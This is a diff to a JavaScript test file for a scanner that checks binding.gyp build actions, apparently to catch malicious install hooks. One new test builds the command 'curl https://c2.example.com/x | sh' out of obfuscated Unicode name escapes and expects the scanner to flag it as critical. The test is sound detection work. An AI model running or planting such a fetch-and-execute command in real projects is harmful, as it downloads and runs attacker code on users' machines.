@@ -57,8 +57,11 @@ const gyp = (text) => scanGyp("binding.gyp", text).map((i) => (i.rule === "SC-IN
 test("\\N{…} escapes, by name or alias, in any case", () => {
   assert.deepEqual(cmd("'caf\\N{LATIN SMALL LETTER E WITH ACUTE}', '\\N{latin small letter a}', 'x\\N{SP}y', '\\N{NBSP}', '\\N{KELVIN SIGN}'"),
     ["caf\u00e9 a x y \u00a0 \u212a"]);
-  assert.deepEqual(gyp("{'action': ['\\N{LATIN SMALL LETTER C}url', 'x']}"), [["CRITICAL", "curl x"]]);
-  assert.deepEqual(gyp("{'action': ['ba\\N{LATIN SMALL LETTER LONG S}e64']}"), [["CRITICAL", "ba\u017fe64"]]);
+  assert.deepEqual(gyp("{'action': ['\\N{LATIN SMALL LETTER C}url', 'https://c2.example.com/x', '|', 'sh']}"),
+    [["CRITICAL", "curl https://c2.example.com/x | sh"]]);
+  // a download or evaluation tool only hints (0.1.8), ſ folding to s as in core's re.I
+  const [hinted] = scanGyp("binding.gyp", "{'action': ['ba\\N{LATIN SMALL LETTER LONG S}e64']}");
+  assert.deepEqual([hinted.sev, hinted.cmd, hinted.msg.includes("runs a download or evaluation command")], ["MAJOR", "ba\u017fe64", true]);
   for (const bad of ["'\\N{}'", "'\\N{ A}'", "'\\N{LATIN  SMALL LETTER A}'", "'\\N'", "'\\N{A'"]) assert.deepEqual(cmd(bad), UNPARSEABLE, bad);
   // a well-formed name outside pynames.js's table is accepted (it may be valid for Python), as U+FFFD
   assert.deepEqual(cmd("'\\N{GREEK SMALL LETTER ALPHA}'"), ["\ufffd"]);
